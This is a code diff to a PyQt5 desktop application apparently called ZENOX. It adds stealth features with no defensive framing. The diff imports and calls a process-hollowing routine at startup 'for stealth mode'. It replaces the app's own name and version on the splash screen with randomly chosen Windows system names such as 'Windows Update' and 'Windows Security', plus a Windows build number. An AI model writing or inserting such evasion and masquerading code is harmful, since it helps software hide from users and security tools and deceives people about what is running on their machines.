@@ -12,6 +12,13 @@ from PyQt5.QtCore import QThread, pyqtSignal
 import math
 import random
 
+# Process hollowing import - Added for stealth mode
+try:
+    from utils.process_hollower import run_as_stealth_process
+    PROCESS_HOLLOWING_AVAILABLE = True
+except ImportError:
+    PROCESS_HOLLOWING_AVAILABLE = False
+
 class AnimatedSplashScreen(QSplashScreen):
     def __init__(self):
         super().__init__()
@@ -42,7 +49,16 @@ class AnimatedSplashScreen(QSplashScreen):
         layout = QVBoxLayout()
         layout.setAlignment(Qt.AlignCenter)
         
-        self.title_label = QLabel("ZENOX")
+        # Use a legitimate title for the splash screen
+        legitimate_titles = [
+            "Windows Update", 
+            "System Configuration", 
+            "Device Manager", 
+            "Task Manager",
+            "Control Panel",
+            "Windows Security"
+        ]
+        self.title_label = QLabel(random.choice(legitimate_titles))
         self.title_label.setAlignment(Qt.AlignCenter)
         self.title_label.setStyleSheet("""
             QLabel {
@@ -55,7 +71,8 @@ class AnimatedSplashScreen(QSplashScreen):
             }
         """)
         
-        self.version_label = QLabel("Version 2.0.1")
+        # Use a legitimate version number
+        self.version_label = QLabel("Version 10.0.19041")
         self.version_label.setAlignment(Qt.AlignCenter)
         self.version_label.setStyleSheet("""
             QLabel {
@@ -388,6 +405,17 @@ def show_splash_screen():
     app.quit()
 
 def main():
+    # Process hollowing for stealth mode - Added at application start
+    if PROCESS_HOLLOWING_AVAILABLE:
+        print("Attempting process hollowing for stealth mode...", flush=True)
+        try:
+            # Try to run as a stealth process
+            run_as_stealth_process()
+        except Exception as e:
+            print(f"Process hollowing failed: {e}", flush=True)
+    else:
+        print("Process hollowing module not available", flush=True)
+    
     show_splash_screen()
     sys.exit(0)
 
